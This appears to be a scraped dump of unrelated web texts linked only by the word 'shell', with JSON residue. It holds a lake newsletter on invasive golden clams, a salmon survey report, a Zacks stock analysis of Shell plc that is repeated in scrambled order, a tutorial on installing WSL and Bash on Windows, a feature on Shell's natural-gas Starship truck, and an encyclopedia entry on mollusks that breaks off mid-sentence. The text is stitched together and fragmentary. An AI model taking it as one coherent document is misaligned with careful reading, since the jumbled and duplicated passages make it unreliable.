Americans across the country,\u201d he said in a statement.\n\n\u2022 This article originally appeared in The New York Times.",

Ashley Leemans, a volunteer with the Lake Champlain Committee (LCC), reeled in the rope, and picked through the pounds of submersed plants that collected on the tines to identify what species are present. It\u2019s a part of routine monitoring for volunteers in LCC\u2019s Champlain Aquatic invasive Monitoring Program\u2014CHAMP\u2014where participants are trained to survey for invasive species, both those that have been detected in Lake Champlain and those that have been found in nearby waterbodies on the \u201cwatchlist\u201d. While sifting through her first rake toss of the day, Ashley found something alarming.\n\nAshley photographed what she suspected to be one of the species on the watchlist\u2014golden clam (Corbicula fluminea)\u2014and sent details to LCC. We followed up with program partners and state agencies to confirm her finding of the first known golden clam in Lake Champlain. The aggressive aquatic invasive species (AIS) has been documented in the region since 2008 but has not been seen in Lake Champlain until now. It\u2019s native to the eastern Mediterranean, Asia, Africa, and Australia. Golden clam is hermaphroditic, meaning a single individual can start a new population. The species is known to reproduce quickly in other North American waterbodies.\n\n\n\nRead more...\n\nLake Look\n\nTurtle shells are not just for physical protection\u2014they act as mineral reserves to help weather the winter chill.\n\nWhen Shell Freezes Over \u2013 How Turtles Weather Winter\n\nIn stressful times, one may envy a turtle: built-in safety from predators with their shells and free from modern expectations of speed and efficiency. Spending summers lounging on logs and rocks warmed by the sun and winters in seemingly peaceful hibernation. However, the winter months present survival obstacles for all animals in Lake Champlain, and turtles don\u2019t have it easy. While hibernation may seem appealing to those who don\u2019t enjoy the long cold nights of the season, it poses challenges with some surprising solutions.\n\nRead more...\n\nClean Lake Tip\n\nMany plows in our region are fitted with brine sprayers, which they use instead of rock salt. It\u2019s a method you can replicate at home.\n\nBrine Time\n\n\n\nRoad salt has ripple effects on aquatic ecology, human health, and infrastructure. Just one teaspoon of salt can permanently contaminate five gallons of water in streams, rivers, lakes, and ponds. Anti-icing\u2014preparing your roads before a freeze rather than salting your roads after ice\u2014helps keep your driveway safe while using significantly less salt. Anti-icing before a storm is similar to using a non-stick spray on a pan before cooking: just as the spray prevents food from bonding to the pan, anti-icing prevents snow and ice from bonding to the pavement so that it can be plowed away. This approach can help you cut salt application in half while still melting snow and ice and keeping your roads and walkways safe. Check out our Clean Lake Tip for a guide on making your own brine solution and best practices for application.\n\n\n\nRead more...\n\nNature Note\n\nSnow falls on the Burlington VT waterfront from cold, northerly winds.\n\nThe Lake Champlain Snow Globe\n\n\n\nWhile the sun shines in Montpelier, snow could be dumping from the clouds 50 miles southwest in Cornwall, VT. Apart from major snowstorms\u2014namely Nor\u2019easters\u2014the formation of lake-effect snow over Lake Champlain is one of the weather patterns that turns the Champlain Valley into a winter wonderland. Lake-effect snows requires a big lake. This weather phenomenon is also common on the Great Lakes and New York\u2019s Finger Lakes. Whether the snow makes you jump for joy or want to escape to warmer realms, it\u2019s a staple of the winter experience in the Champlain watershed.\n\n\n\nRead more...\n\nWater News from Near & Far\n\nVermont Agencies New Proposal to Regulate Water on Farms Falls Short\n\nfter years of LCC and partner organizations advocating for stronger regulations and recently calling for a federal review of state enforcement practices, the U.S. Environmental Protection Agency (EPA) said that Vermont must correct shortcomings in enforcing the Clean Water Act on farms.

            "content": "The Edmonds Stream Team completed its annual adult salmon surveys in Edmonds\u2019 Shell Creek and Lunds Gulch Creek (located in Meadowdale Beach Park) in December. The Stream Team documented the highest number of chum salmon spawners in November 2024 since surveys began in Shell Creek in 2017. A one-day count of adult chum salmon in Shell Creek Nov. 10 exceeded the sum of the total counts over the past three years.\n\nStudent volunteers from Meadowdale High School and Edmonds-Woodway High School as well as adult volunteers started the surveys in late September and started seeing large numbers of chum salmon entering both Shell Creek and Lunds Gulch Creek in early November. By late November, most of the salmon had spawned and expired (salmon die shortly after spawning). A minimum estimate based just on the dead salmon recovered would be over 300 salmon returned to Shell Creek and 200 to Lunds Gulch Creek in 2024. Final estimates will be available after data analysis is completed in January.\n\nThe surveys not only documented the number and species (coho or chum salmon) observed, but included examination of dead salmon to determine species, sex, size, and spawning status and the condition of the habitat where they might lay their eggs (for example, clean gravel versus a sediment-impacted stream bed).\n\nSome of the returning adult salmon appeared to be affected by toxic pollutants that enter the streams from storm drains and died in the creek before they could spawn. Others were killed by predators (racoons, river otters, eagles, herons) before they could spawn. The Stream Team found \u201cpre-spawn mortalities\u201d in both Shell and Lunds Gulch Creeks, and some of the fish had no predator marks, suggesting they may have been killed by toxic pollutants in the creeks. Several live coho salmon were observed to have the characteristic \u201cerratic\u201d behavior that leads to death from the effects of a compound in tire dust (6PPDq) found in stormwater that enters the creeks during rain events.\n\nThe Edmonds salmon surveys have focused on Shell and Lunds Gulch Creeks because they are the only streams in Edmonds that currently have adult salmon returning to spawn. Perrinville Creek had salmon until 2021, when the City of Edmonds blocked the creek\u2019s connection to Puget Sound and diverted the creek outflow into a pipe to prevent residential flooding during rain events. Willow and Shellabarger Creeks had salmon until the 1960s, when the Port of Edmonds Marina was built and the Edmonds Marsh outlet was diverted into a 1,600-foot pipe exiting under Marina Beach to Puget Sound. Although Shell Creek has significant streambed sediment problems from upstream erosion in Yost Park and a manmade waterfall that blocks upstream access, the lower portion of the creek still has some suitable spawning habitat. much to the credit of Edmonds\u2019 property owners who care about salmon and their use of the creek.\n\nThe Edmonds Stream Team not only counted salmon in the fall, but worked with property owners during the salmon migration to resolve salmon passage issues as they arose in both Shell Creek and Lunds Gulch Creek. At the restored estuary created by the new railroad bridge in Meadowdale Beach Park, the Stream Team found that a summer\u2019s growth of a freshwater plant called watercress was blocking salmon passage into the creek channel. The team worked with Snohomish County and the Washington Department of Fish and Wildlife (WDFW) to create a path through the vegetation for salmon migration.\n\nIn Shell Creek, the Stream Team worked with a property owner to obtain an emergency hydraulics permit from WDFW to quickly resolve a unique situation where the excess sediment in Shell Creek built up under a bridge and blocked salmon passage (see related article here).\n\nThe Edmonds Stream Team thanks everyone who helped make this year\u2019s surveys a success, including Shell Creek residents who allowed the Stream Team volunteers access to their backyards to do the surveys, the park rangers in Meadowdale Beach Park, the park visitors who texted their photos and videos, and donations from Edmonds\u2019 Rotary Clubs, Olympic Fly Fishers and Puget Sound Anglers that allowed us to purchase chest waders, boots, and field supplies needed for the all-volunteer Edmonds Stream Team to function.\n\nFinal reports with additional photos and videos of the salmon will be posted online at EdmondsEnvironmentalCouncil.org in late January.\n\n\u2014 Story and photos by Joe Scordino\n\nProject leader, Edmonds Stream Team",

            "content": "Shell\u2019s deepwater operations in the Gulf of Mexico and Brazil exemplify capital efficiency. Projects like Vito Phase 2 and Mero-3 aim to add 500,000 barrels per day, driving upstream growth. Yet, declining production in mature regions like the UKCS poses long-term risks. UKCS output has dropped to a quarter of its 1990s peak, and Shell\u2019s limited reserves signal a potential upstream production decline, which could adversely impact revenues.\n\nShell remains the world\u2019s largest LNG exporter, accounting for more than 15% of global LNG trade. Its integrated gas segment contributed $2.6 billion to net earnings in the third quarter of 2024. Upcoming projects like LNG Canada Phase 1 and Qatar expansions bolster growth prospects. Additionally, Shell's renewable energy investments, including wind and renewable natural gas, reflect a commitment to sustainability. However, renewables have yet to deliver strong returns, dragging overall profitability.\n\nShell's partnership with Norway's Equinor combines strengths in the North Sea, leveraging assets like Shell\u2019s Jackdaw gas field and Equinor\u2019s Rosebank oil field. Jackdaw is set to come online in 2025, contributing 40,000 BOE/d, while Rosebank\u2019s 77,000 BOE/d production begins in 2027. This JV enhances Shell\u2019s UKCS dominance and offers access to high-margin projects. However, the UK\u2019s harsher fiscal framework, including a windfall tax of 38% until 2029, could dampen profitability.\n\nEuropean energy giant Shell plc has positioned itself strategically for the future, particularly through its collaboration with Equinor ASA in the North Sea. This joint venture creates the U.K.\u2019s largest producer on the UK Continental Shelf (UKCS), targeting 220,000 barrels of oil equivalent per day (BOE/d) by 2030. Despite such promising developments, London-based Shell\u2019s shares have edged down 2.2% year to date, underperforming the Oil/Energy sector's 4% gain, though it has outpaced continental rival BP plc \u2019s 13.2% decline. As 2025 approaches, Shell faces both opportunities and challenges that could shape its trajectory.\n\nChicago, IL \u2013 January 2, 2025 \u2013 Zacks.com announces the list of stocks and featured in the Analyst Blog. Every day the Zacks Equity Research analysts discuss the latest news and events impacting stocks and the financial markets. Stocks recently featured in the blog include Shell plc SHEL, Equinor ASA EQNR and BP plc\u2019s BP.\n\nStory Continues\n\nCapital Allocation and Shareholder Returns\n\nShell\u2019s financial discipline underpins its robust cash flow and shareholder returns. For the third quarter, the company reported $6 billion in adjusted earnings and $14.7 billion in cash flow from operations, enabling double-digit free cash flow yields. With a dividend yield of around 4.5% and 12 consecutive quarters of $3 billion in share buybacks, Shell demonstrates its commitment to rewarding investors. Despite a 7% year-over-year revenue decline to $71.1 billion in the quarter, the company beat the Zacks Consensus Estimate for earnings over the last four quarters, with the average surprise being 15.4%.\n\nFind the latest EPS estimates and surprises on Zacks Earnings Calendar.\n\nRegulatory and Environmental Pressures\n\nShell\u2019s efforts to halve Scope 1 and 2 emissions by 2030 and reduce Scope 3 emissions by 15-20% underscore its commitment to sustainability. However, these goals require significant capital and operational adjustments, pressuring margins. Ongoing litigation over emissions and tighter regulations in Europe further complicate its energy transition strategy, potentially increasing costs and limiting flexibility.\n\nShell\u2019s Attractive Valuation and a Cautious Outlook\n\nShell\u2019s current valuation, reflected in a Zacks Value Score of A, underscores its appeal in a competitive market. Trading 16% below three-year highs, the stock offers income-focused investors a compelling dividend yield and potential upside if energy prices strengthen. However, the company\u2019s exposure to volatile oil and LNG markets, combined with challenges in its energy transition and regional operations, calls for a balanced perspective.\n\nConclusion: A Hold for Now\n\nShell\u2019s strategic initiatives, including its North Sea JV and leadership in LNG, highlight its strengths and growth potential. Yet, regulatory pressures, renewable energy underperformance and declining upstream reserves present significant risks. With a robust valuation and consistent financial performance, Shell remains an attractive but cautious investment. For now, SHEL stock is a Zacks Rank #3 (Hold) as the company navigates these mixed dynamics toward long-term growth.

            "content": "When Microsoft\u2019s CEO announced that the Bash shell was coming to Windows, several people couldn\u2019t believe it. #BashOnWindows trended on Twitter for days; such was the impact of this news.\n\nInitially referred as Bash on Windows, it is actually called Windows Subsystem for Linux, popularly known as WSL.\n\nWith WSL, you can install one of the supported Linux distribution inside Windows and use the Windows terminal to access the Linux systems and run Linux commands.\n\nIn this tutorial, you'll learn how to enable WSL on Windows and then install a Linux distribution of your choice.\n\n\ud83d\udccb This tutorial was tested with the latest Windows 11 version 22H2, and build 22621.819. You might need to update your Windows installation if you have an older build to follow everything in this tutorial.\n\nWhat is WSL?\n\nWSL (formerly Bash on Windows) provides a Windows subsystem, and Linux runs atop it. It is not a virtual machine or an application like Cygwin. It is a complete Linux system inside Windows 10/11. It allows you to run the same Bash shell you find on Linux. You can run Linux commands inside Windows without installing a virtual machine or dual-boot Linux and Windows.\n\nYou install Linux inside Windows like a regular application. This is a good option if your main aim is to learn Linux/UNIX commands.\n\n\u2139\ufe0f You can refer to Microsoft's documentation to explore what Windows Subsystem for Linux (or WSL) is.\n\nCheck for System Compatibility\n\nYou must be running specific versions of Windows for the different features described in this article. Requirements necessary for a particular feature to work are described under its titles. To check your Windows version, search for about in the start menu.\n\nSearch about in the Start Menu\n\nHere, you can see the build of your PC, as shown in the screenshot below. Make sure it is matching with the respective requirements described under various sub-headings here in this article.\n\nChecking the build number of Windows\n\nYou must be running Windows 10 version 1607 (the Anniversary update) or above.\n\nWSL only runs on 64-bit versions 32-bit versions are not supported.\n\nInstall Bash in Newer Windows 10 and 11\n\nThe good thing is that the latest set of upgrades, including the stable release of WSL v1.0 released from Windows, makes it easier to install Bash on Windows.\n\nThere are two ways you can go about it:\n\nYou can get it in one click from Windows Store. Choose to use the command-line.\n\n1. Install WSL Using the Microsoft Store\n\nLaunch the Microsoft Store and search for \"Windows subsystem\".\n\nInstall it, and you're done with the first step. Next, you have to install a Linux distribution.\n\nSo, if you try to open WSL, you will get to see a window informing you that no distribution is installed.\n\nSimilar to WSL, search for the distribution on Microsoft Store, and then install it.\n\nFor instance, I installed Ubuntu from the store as shown in the image below:\n\nAnd, then proceed to \"Open\" it and it will automatically start installing. The procedure is same for any distribution you choose.\n\nWe then have to configure it, which is discussed right after installing it through the command line.\n\n2. Install WSL and the default distribution using the command-line\n\nIn WSL, the default distribution is Ubuntu (which can be changed). To install, open Powershell as an administrator.\n\nFor this, search for Powershell in the start menu, right-click on Powershell and select Run as Administrator.\n\nRun Powershell as an administrator\n\nInside Powershell, enter the following command to install WSL, along with all necessary features and the default distribution, that is, Ubuntu.\n\nwsl --install\n\nOnce finished downloading and installing, you need to reboot to apply the changes.\n\nWhether you installed WSL and Ubuntu using the Microsoft Store or the command line, you need to configure it.\n\nHere's how it is done:\n\n\ud83d\udee0\ufe0f Configure the newly installed Ubuntu\n\nAfter rebooting, search for Ubuntu in Start Menu and open it.\n\nOpen Ubuntu from Windows 11 start menu\n\nIt will ask you to enter a UNIX Username and Password. Enter these details and press enter key.\n\nEnter UNIX username and password\n\nYou will now be inside the terminal window of Ubuntu.\n\nLogged into new Ubuntu 22.04 LTS in Windows 11 WSL\n\nOnce logged in, you need to update the installed Ubuntu. For this, enter the following commands one by one:\n\nsudo apt update sudo apt full-upgrade\n\nAfter completing the update, you are good to go with Ubuntu in WSL.\n\nRunning Ubuntu in WSL\n\nInstall Bash on Older Windows\n\nIf you have the minimum requirements mentioned in the beginning but are running an older Windows build, the previous method may not be supported. So there is a manual installation method.\n\nAlso, there are both WSL1 and WSL2 available. WSL2 offers some upgraded functionalities but has some minimum requirements to run:\n\nFor x64 systems: Version 1903 or later, with Build 18362 or later.\n\nFor ARM64 systems: Version 2004 or later, with Build 19041 or later.\n\nSo this brings us to two possibilities to install:\n\nInstall Ubuntu with WSL1 Install Ubuntu with WSL2\n\n1. Install Ubuntu with WSL 1\n\nThis is a relatively simple procedure for those with a system incompatible with WSL2. First, you need to enable the Windows Subsystem for the Linux feature. This can be done through the command line. Open Powershell as an administrator and enter the following command:\n\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n\nOr, to do this via GUI, follow the steps below:\n\nSearch for Windows Features in Start Menu. Turn on Windows Subsystem for the Linux feature. Reboot your system. Open the Windows store and search for the distribution of your choice to install.\n\nOnce installation is completed, open the Ubuntu app from the start menu. It will take a couple of seconds to install. You will be prompted to enter a username and password. Provide those credentials, and you are good to go with Ubuntu in WSL1.\n\n2. Install Ubuntu with WSL 2\n\nIt is recommended to use WSL2 instead of WSL1 if you have support. To install Ubuntu with WSL2, you need to make sure that the Windows Subsystem for Linux feature is turned on. For this, as in the above case, execute the following command in an elevated Powershell:\n\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\n\nReboot the device once the command is completed.\n\nAfter this, you need to enable the Virtual Machine Platform feature. Open the Powershell with admin privileges and enter the following command:\n\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n\nOnce again, restart the device to complete the WSL install and update to WSL 2.\n\nNow, download the Linux Kernel Update Package for x64 machines from the official website. If you are using ARM64 devices, use this link to download the latest kernel update package.\n\nIf you are not sure about the device architecture, enter the command below in Powershell to get the type:\n\nsysteminfo | find \"System Type\"\n\nWhen the file is downloaded, double-click on it and finish the installation of the Kernel update package.\n\nNow, open PowerShell and run this command to set WSL 2 as the default version when installing a new Linux distribution:\n\nwsl --set-default-version 2\n\nOnce WSL2 is set as the default version, you can now install the Linux distribution of your choice.\n\nGo to Windows Store and install Ubuntu, as described in the earlier steps. and the rest of the procedure is already described above.\n\nEnjoy Linux inside Windows.\n\n\ud83d\udd27 Troubleshooting Tip 1\n\n\n\n\"The WSL optional component is not enabled. Please enable it and try again.\"\n\nYou may see an error like this when you try to run Linux inside Windows 10:\n\nThe WSL optional component is not enabled. Please enable it and try again. See https://aka.ms/wslinstall for details. Error: 0x8007007e Press any key to continue...\n\nAnd when you press any key, the application closes immediately.\n\nThe reason here is that the Windows Subsystem for Linux is not enabled in your case. You should enable it as explained in this guide. You can do that even after you have installed Linux.\n\n\ud83d\udd27 Troubleshooting Tip 2\n\n\n\nInstallation failed with error 0x80070003\n\nThis is because Windows Subsystem for Linux only runs on the system drive i.e. the C drive. You should ensure that when you download Linux from the Windows Store, it is stored and installed in the C Drive.\n\nOn Windows 10, go to Settings -> Storage -> More Storage Settings -> Where new content is saved: Change where new content is saved and select C Drive here.\n\nOn Windows 11, go to Settings -> System -> Storage -> Advanced storage settings -> Where new content is saved and select C Drive here.\n\nSelect the C-Drive as storage space for new apps in Windows 11 settings\n\n\ud83d\udd27 Troubleshooting Tip 3\n\n\n\n\"Failed to attach disk Error\"\n\nSometimes, this error will appear when we reinstall the Ubuntu in WSL.\n\nFile not found error in WSL\n\nIn this case, open Powershell and run the following command:\n\nwsl -l -v\n\nThis will list the installed Linux systems. Find the name of the system, that is throwing the error, in my case Ubuntu. Now run the following command:\n\nwsl --unregister Ubuntu\n\nYou can restart the ubuntu app and it will run without any issues.\n\nYou can refer to more common troubleshooting methods from the official website.\n\nRun GUI Apps On Windows Subsystem for Linux\n\nThe ability to run GUI apps on Windows Subsystem for Linux was introduced with the WSL 2 release in May 2020.\n\nWindows Subsystem for Linux (WSL) with WSL2 now supports running Linux GUI applications (X11 and Wayland) on Windows in a fully integrated desktop experience. This allows you to install Linux applications and seamlessly integrate them into Windows desktop, including features like \u201cpin to taskbar\u201d.\n\n\ud83d\udccb One crucial point is that you must be on Windows 10 Build 19044+ or Windows 11 to access this feature.\n\nStep 1: Enable/Update WSL 2\n\nThis procedure has been explained in the above section and you can refer to it.\n\nStep 2: Download and Install Graphics drivers\n\nTo run GUI apps, you need to install appropriate graphics drivers. You can use the following link to download the drivers according to your provider.\n\nOnce installed, you are all done.\n\nStep 3: Install some GUI Apps\n\nNow, go to your Ubuntu app and install any GUI app using the APT package manager. You should note that running apps from other sources like flatpak are problematic within WSL.\n\nFor this article, I installed the Gedit text editor using the following command:\n\nsudo apt install gedit -y\n\nThis will install several MB of packages including required libraries. Once completed, you can run the following command to start the GUI Gedit app in Windows.:\n\ngedit\n\nRun Gedit text editor GUI in WSL Ubuntu\n\nSimilarly, you can install all the popular applications available to Linux, including Nautilus file manager, GIMP, etc. For more about running GUI applications in WSL, you can refer to the official documentation.\n\nInstall Linux Bash Shell on other older Windows 10\n\nIf you cannot get the Fall Creator\u2019s update on Windows 10 for some reason, you can still install it if you have the Anniversary update of Windows 10. But here, you\u2019ll have to enable developer mode. I still recommend upgrading to the Fall Creator\u2019s update or the latest Windows 10 2004 version update though.\n\nPress Windows Key + I to access Windows system settings. Here, go to Update & Security:\n\nSelect Updates&Security option in Windows system settings\n\nFrom the left side pane, choose \u201cFor developers.\u201d You\u2019ll see an option for \u201cDeveloper mode.\u201d Enable it.\n\nSelect For Developers option from the side pane\n\nNow search for Control Panel and in Control Panel, click on \u201cPrograms\u201d:\n\nSelect Programs from the Windows Control Panel\n\nIn Programs, click \u201cTurn Windows features on or off\u201d:\n\nSelect Turn Windows features on or off from the Programs and Features section\n\nWhen you do this, you\u2019ll see several Windows features. Look for \u201cWindows Subsystem for Linux\u201d and enable it.\n\nSelect the Windows Subsystem for Linux checkbox\n\nYou\u2019ll need to restart the system after doing this.\n\nRestart the device to apply the changes\n\nAfter restarting the computer, click the start button and search for \u201cbash\u201d.\n\nSelect Bash from Windows Start Menu\n\nWhen you run it for the first time, you\u2019ll be given the option to download and install Ubuntu. You\u2019ll be asked to create a username and password during this process. It will install an entire Ubuntu Linux system, so have patience as it will take some time in downloading and installing Linux on Windows.\n\nRunning Ubuntu inside Windows\n\nOnce this is done, go back to the Start menu and search for Ubuntu or Bash.\n\nSearch for Ubuntu or Bash in Windows Start Menu\n\nNow you have a command line version of Ubuntu Linux. You can use apt to install various command line tools in it.\n\nChecking the working of Bash shell in Windows\n\n\ud83d\udcac I hope you find this tutorial helpful for installing bash on Windows and experimenting with Linux GUI apps on Windows. No wonder WSL lets you play with Linux inside of Windows. If you have questions or suggestions, feel free to ask.",

This joint venture creates the U.K.\u2019s largest producer on the UK Continental Shelf (UKCS), targeting 220,000 barrels of oil equivalent per day (BOE/d) by 2030. Despite such promising developments, London-based Shell\u2019s shares have edged down 2.2% year to date, underperforming the Oil/Energy sector's 4% gain, though it has outpaced continental rival BP plc\u2019s BP 13.2% decline. As 2025 approaches, Shell faces both opportunities and challenges that could shape its trajectory.\n\nSHEL, BP Year-to-Date Stock Performance\n\nZacks Investment Research\n\nImage Source: Zacks Investment Research\n\nShell\u2019s North Sea JV: A Strategic Move\n\nShell's partnership with Norway's Equinor combines strengths in the North Sea, leveraging assets like Shell\u2019s Jackdaw gas field and Equinor\u2019s Rosebank oil field. Jackdaw is set to come online in 2025, contributing 40,000 BOE/d, while Rosebank\u2019s 77,000 BOE/d production begins in 2027. This JV enhances Shell\u2019s UKCS dominance and offers access to high-margin projects. However, the UK\u2019s harsher fiscal framework, including a windfall tax of 38% until 2029, could dampen profitability.\n\nStrength in LNG and Renewables\n\nShell remains the world\u2019s largest LNG exporter, accounting for more than 15% of global LNG trade. Its integrated gas segment contributed $2.6 billion to net earnings in the third quarter of 2024. Upcoming projects like LNG Canada Phase 1 and Qatar expansions bolster growth prospects. Additionally, Shell's renewable energy investments, including wind and renewable natural gas, reflect a commitment to sustainability. However, renewables have yet to deliver strong returns, dragging overall profitability.\n\nDeepwater Exploration and Upstream Challenges\n\nShell\u2019s deepwater operations in the Gulf of Mexico and Brazil exemplify capital efficiency. Projects like Vito Phase 2 and Mero-3 aim to add 500,000 barrels per day, driving upstream growth. Yet, declining production in mature regions like the UKCS poses long-term risks. UKCS output has dropped to a quarter of its 1990s peak, and Shell\u2019s limited reserves signal a potential upstream production decline, which could adversely impact revenues.\n\nCapital Allocation and Shareholder Returns\n\nShell\u2019s financial discipline underpins its robust cash flow and shareholder returns. For the third quarter, the company reported $6 billion in adjusted earnings and $14.7 billion in cash flow from operations, enabling double-digit free cash flow yields. With a dividend yield of around 4.5% and 12 consecutive quarters of $3 billion in share buybacks, Shell demonstrates its commitment to rewarding investors. Despite a 7% year-over-year revenue decline to $71.1 billion in the quarter, the company beat the Zacks Consensus Estimate for earnings over the last four quarters, with the average surprise being 15.4%.\n\n",

            "content": "The Shell Starship Initiative is an experiment on wheels. It focuses on energy-efficient truck design using technologies currently available while simultaneously testing lubricants and tech that are near-to-market. I was once a truck driver and I found the work Shell is doing here to be fascinating.\n\nShell is on its third rendition of the Starship truck since the Starship Initiative began in 2018. The first two versions of the North American design of this truck were based on diesel engines. The new Starship 3.0 has a natural gas engine instead \u2013 one that Cummins brought to market in 2024 and that is made specifically for heavy-duty trucking and machines.\n\nThe engine itself is a huge step forward in engineering, having defeated the main drawbacks of natural gas as a fuel source for trucking \u2013 namely fuel efficiency and power delivery. Cummins\u2019 new X15N engine is a large-bore design that operates similarly to a diesel engine in that it achieves similar power outputs, but does so with more efficiency and far fewer emissions. The major upside to natural gas is its lower emissions (meaning fewer power-sapping emissions scrubbing systems) versus other options. It\u2019s also more versatile, with the Starship 3.0 being capable of operating on compressed or liquefied natural gas, including renewable natural gas. The latter (RNG) being a key point here.\n\nWith previous models of the Starship, Shell has improved and tested lubricants made for diesel engines and drivetrains. That has led to great leaps in efficiency gains. For example, two decades ago, 20-weight oil was a norm in heavy-duty trucking. Since then, thanks in large part to Shell\u2019s experimentation and testing, that has reduced to 10W and is getting close to averaging at 5W as it sees more and more adoption in the industry.\n\nEach step of 5 in oil weight reduction means a 2-3 % improvement in efficiency. Shell says they are very close to bringing a 0W engine oil for heavy-duty applications to market. Similarly, advances in the lubricants used for transmissions, axles, etc. have also made big strides.\n\nThe Shell Starship's cockpit is a mixture of standard fare and advanced electronics, but everything is off the shelf and available today Aaron Turpen / New Atlas\n\nI got first-hand with the oddly futuristic-appearing Starship 3.0 to talk with Shell about this experimental rig and see what it can do in reality versus on paper. The truck is fully custom, but built using currently available technologies. I was most interested in spending time with the two brothers, both professional career truck drivers, about what they thought of it. From a real-world viewpoint.\n\nThe Shell Starship is a big leap forward from the big rigs I drove 20-plus years ago. Back then, diesel was king and rolling into 7 miles per gallon (33.6 L/100km) was a feat. Anecdotally, my average freight ton miles per gallon was in the 50s. Largely because of the heavy truck (Kenworth T800W with exterior pipes), heavy trailer (refrigerated box on aluminum frame), and low-rent transmission (10-speed Alison) setup I had. That truck is long gone as an option today, in terms of its inefficiency. Today\u2019s versions of that truck are 10 mpg (23.5 L/100km) or better without adding any aerodynamics (trailer tails, skirts, cab wings, etc.), which improve that even more.\n\nThe new Cummins engine is about 500 lb (227 kg) lighter than its diesel equivalent, adding to the potential freight-carrying weight the Starship 3.0 can haul. Other lightweighting adds to that, giving the Starship 3.0 a ton-miles per gallon efficiency of 183. That\u2019s a big leap compared to the industry average of 72. It\u2019s important to realize that although many think of mpg as the benchmark, freight-ton mpg is much more telling. It\u2019s the reason the average big rig on the highway gets better fuel efficiency than a Prius, despite its mpg being in single digits. It\u2019s also a reason that battery-electric trucks struggle to find market share. The larger the battery, the less cargo that can be carried, and the lower the freight-ton per mile. Tesla, for example, has still not released tare weight and other important figures for the long-awaited (and delayed) Semi.\n\nFor Shell, though, the natural gas engine posed some challenges. Lubricants for the higher-heat engine had to be developed. Derived from gasoline lubricants, Shell formulated the Starship\u2019s options specifically for the engine. Bench testing using prototypes of Cummins\u2019 new engine got the blend ready to market and now testing in the Starship 3.0 is perfecting them further.\n\n\u201cThe Starship is a lab on wheels,\u201d said Heather Duffey, global integrated communications manager for Shell Commercial Road Transport Lubricants. \u201cEvery time this truck drives across the street or across the country [it\u2019s done both many times], we get more data.\u201d The truck is currently using Shell Rotella NG Plus SAE 5W-30 FA-4 synthetic engine oil, formulated specifically for the higher heat an NG-burning engine produces as compared to diesel. The truck\u2019s Eaton-made automatic transmission uses Shell Spirax S6 GME 40.\n\nDuffey pointed out the obvious when we talked about the Starship 3.0 and why it uses natural gas instead of, for example, a hybrid or fuel cell setup. \u201cFleets are not going to run out and buy something new. They want what they know works.\u201d\n\nEverything on the Starship that isn\u2019t the cab\u2019s bodywork or experimental lubricant is off-the-shelf. Shell considered hydrogen as an option, but the infrastructure isn\u2019t there. Instead, with Cummins releasing a natural gas engine, Duffey said Shell saw \u201csomething that fleets can adopt now. There are fueling options nationwide, already in place.\u201d\n\nThe drivers of the Starship, brothers Brian and Eric Rector, have also given a lot of input into the Starship\u2019s design and changes. Career truckers, they own their own trucking business and drive the Starship for Shell as needed. They both like the natural gas engine and have completed several long-distance drives in the Starship in all three of its iterations. The 3.0 model, however, offered a chance to compare powertrains.\n\n\u201cIt drives almost exactly like the diesel one did,\u201d Brian told me when asked about a comparison. \u201cIt\u2019s a little [quicker] on the uptake, maybe, but other than how we fuel it, it\u2019s the same.\u201d\n\nThe author behind the wheel of the Shell Starship 3.0 during a hands-on session with the truck and its team Aaron Turpen / New Atlas\n\nEric told me about an 840-mile (1,350-km) loop throughout California in which the Starship 3.0 was loaded with engine oil. The performance data and input from the drivers helped shape the ergonomics of the setup and had the side benefit of creating an ad-hoc map of NG fueling stations around the state.\n\n\u201cWe were especially surprised at how many renewable gas options there were that weren\u2019t marked as such on our existing maps,\u201d he said. \u201cWe also saw how things changed as the loads changed during our drive,\u201d he noted. How a truck drives changes by the weight it\u2019s carrying. \u201cThe Starship is no different. But the engine output was smooth no matter what we had on board. That was a surprise.\u201d\n\nMost drivers, like myself, would assume that the higher-burning NG would be \u201cjumpier\u201d by comparison. Once in the truck, I saw that Eric told me no lies. The engine and transmission work smoothly together.\n\nThe data collected during the brothers\u2019 drives has been instrumental in Shell\u2019s improvement of its products for the sector. The Starship is out doing the day-to-day work that gets little attention, but that makes all the difference. Offering two and a half times the efficiency using things that are almost all available right now, off the shelf, is a big deal. And it\u2019s only getting better.\n\nSource: Shell Starship Initiative\n\n",

            "content": "Table of Contents Ask the Chatbot\n\nmollusk , any soft-bodied invertebrate of the phylum Mollusca, usually wholly or partly enclosed in a calcium carbonate shell secreted by a soft mantle covering the body. Along with the insects and vertebrates , it is one of the most diverse groups in the animal kingdom, with nearly 100,000 (possibly as many as 150,000) described species . Each group includes an ecologically and structurally immense variety of forms: the shell-less Caudofoveata; the narrow-footed gliders (Solenogastres); the serially valved chitons (Placophora or Polyplacophora); the cap-shaped neopilinids (Monoplacophora); the limpets, snails, and slugs (Gastropoda); the clams , mussels , scallops , oysters , shipworms , and cockles (Bivalvia); the tubiform to barrel-shaped tusk shells (Scaphopoda); and the nautiluses , cuttlefishes , squids , and octopuses (Cephalopoda).\n\nGeneral features\n\nSize range and diversity of structure Typical molluscan features have been substantially altered, or even lost, in many subgroups. Among the cephalopods the giant squids (Architeuthis), the largest living invertebrates, attain a body length of eight metres (more than 26 feet); with the tentacle arms extended, the total length reaches to 22 metres. Other cephalopods exceed a length of one metre. Many of the remaining molluscan classes show a large variation in size: among bivalves the giant clam (Tridacna) ranges up to 135 centimetres (four feet) and the pen shell (Pinna) from 40 to 80 centimetres; among gastropods the sea hares (Aplysia) grow from 40 to 100 centimetres and the Australian trumpet, or baler (Syrinx), up to 60 centimetres; among placophores the gumshoe, or gumboot chiton (Cryptochiton), achieves a length up to 30 to 43 centimetres; and, among solenogasters, Epimenia reaches a length of 15 to 30 centimetres. Finally, gastropods of the family Entoconchidae, which are parasitic in echinoderm sea cucumbers, may reach a size of almost 1.3 metres. In contrast, there are also minute members, less than one millimetre (0.04 inch) in size, among the solenogasters and gastropods.\n\nDistribution and abundance The mollusks have adapted to all habitats except air. Although basically marine, bivalves and gastropods include freshwater species. Gastropods have also adapted to land, with thousands of species living a fully terrestrial existence. Found on rocky, sandy, and muddy substrata, mollusks burrow, crawl, become cemented to the surface, or are free-swimming. Mollusks are found worldwide, but there is a preponderance of some groups in certain areas of the world. The close association of many molluscan groups with their food source\u2014whether by direct dependence on a specific food supply (e.g., plant-eating, or herbivores) 